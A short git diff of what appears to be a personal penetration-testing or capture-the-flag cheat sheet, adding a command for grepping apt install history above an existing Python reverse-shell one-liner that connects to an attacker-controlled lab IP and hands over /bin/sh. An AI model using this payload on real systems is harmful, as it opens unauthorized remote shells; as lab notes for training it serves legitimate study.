@@ -179,6 +179,10 @@ retr <list number>
 
 ## Scripts
 
+- #### Tools Download History
+```sh
+cat /var/log/apt/history.log | grep 'tool-name'
+```
 - #### Python Reverse shell `One-Liner`
 ```py
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<machine_Ip-openvpn>",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
